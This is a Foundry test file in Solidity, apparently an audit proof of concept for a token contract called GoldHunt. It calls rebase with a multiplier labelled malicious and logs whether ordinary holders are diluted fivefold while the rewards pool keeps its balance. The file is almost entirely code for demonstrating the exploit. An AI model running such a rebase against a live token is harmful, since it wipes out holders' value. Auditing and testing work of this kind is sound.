// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/GoldHunt.sol";

contract GoldHuntRebaseTest is Test {
    GoldHunt token;
    MockLP mockLP;
    address owner;
    address rewardsPool = address(0x123);
    address user = address(0x456);

    function setUp() public {
        owner = address(this);
        // Deploy mock LP and token contracts
        mockLP = new MockLP();
        token = new GoldHunt();
        
        // Setup protocol parameters
        token.setRewardsPool(rewardsPool);
        token.setPair(address(mockLP));
        
        // Distribute initial tokens
        token.transfer(rewardsPool, 1000 * 10 ** token.decimals());
        token.transfer(user, 1000 * 10 ** token.decimals());
    }

    function testRebaseDilutesHolders() public {
        // Capture pre-rebase states
        uint256 b_user_pre = token.balanceOf(user);
        uint256 b_rpool_pre = token.balanceOf(rewardsPool);
        uint256 supply_pre = token.totalSupply();

        console2.log("### PRE-REBASE STATE ###");
        console2.log("User balance (pre):       %s", b_user_pre);
        console2.log("Rewards pool balance (pre):%s", b_rpool_pre);
        console2.log("Total supply (pre):      %s", supply_pre);
        
        // Conditionally log rebaseMultiple
        (bool r_multiple_exists, bytes memory r_multiple_data) = address(token).staticcall(abi.encodeWithSignature("rebaseMultiple()"));
        if (r_multiple_exists) {
            console2.log("Rebase multiple (pre):   %s", abi.decode(r_multiple_data, (uint256)));
        } else {
            console2.log("WARNING: rebaseMultiple() not available");
        }

        // Define and log rebase parameters
        uint256 maliciousMultiple = 5;
        console2.log("\n### TRIGGER REBASE (MULTIPLIER %s) ###", maliciousMultiple);
        token.rebase(maliciousMultiple);

        // Capture post-rebase states
        uint256 b_user_post = token.balanceOf(user);
        uint256 b_rpool_post = token.balanceOf(rewardsPool);
        uint256 supply_post = token.totalSupply();

        console2.log("\n### POST-REBASE STATE ###");
        console2.log("User balance (post):       %s", b_user_post);
        console2.log("Rewards pool balance (post):%s", b_rpool_post);
        console2.log("Total supply (post):      %s", supply_post);
        
        // Conditionally log post-rebase multiple
        (r_multiple_exists, r_multiple_data) = address(token).staticcall(abi.encodeWithSignature("rebaseMultiple()"));
        if (r_multiple_exists) {
            console2.log("Rebase multiple (post):   %s", abi.decode(r_multiple_data, (uint256)));
        }

        console2.log("\n### VULNERABILITY VERIFICATION ###");
        // Inline value comparisons to prevent stack errors
        bool userDiluted = b_user_post == b_user_pre / maliciousMultiple;
        bool supplyValid = supply_post == (supply_pre + (b_rpool_pre * (maliciousMultiple - 1))) / maliciousMultiple;
        bool rpoolUnchanged = b_rpool_post == b_rpool_pre;
        
        // Simplified log outputs
        console2.log("User properly diluted:    %s", userDiluted ? "YES" : "NO");
        console2.log("    Expected: %s, Actual: %s", b_user_pre / maliciousMultiple, b_user_post);
        
        console2.log("Total supply valid:       %s", supplyValid ? "YES" : "NO");
        console2.log("    Expected: %s, Actual: %s", (supply_pre + (b_rpool_pre * (maliciousMultiple - 1))) / maliciousMultiple, supply_post);
        
        console2.log("Rewards pool unchanged:   %s", rpoolUnchanged ? "YES" : "NO");
        console2.log("    Expected: %s, Actual: %s", b_rpool_pre, b_rpool_post);
        
        // Final vulnerability determination
        bool vulnerabilityExists = userDiluted && supplyValid && rpoolUnchanged;
        console2.log("\n--- VERDICT ---");
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Malicious rebase successfully altered token supply and balances");
        } else {
            console2.log("Vulnerability not Exist: State changes indicate normal rebase behavior");
        }
        
        // Assert original test conditions
        assertEq(b_user_post, b_user_pre / maliciousMultiple, "User balance not properly diluted");
        assertEq(b_rpool_post, b_rpool_pre, "Rewards pool balance unexpectedly changed");
        assertEq(supply_post, (supply_pre + (b_rpool_pre * (maliciousMultiple - 1))) / maliciousMultiple, "Total supply update failed");
    }
}

contract MockLP {
    function sync() external {}
}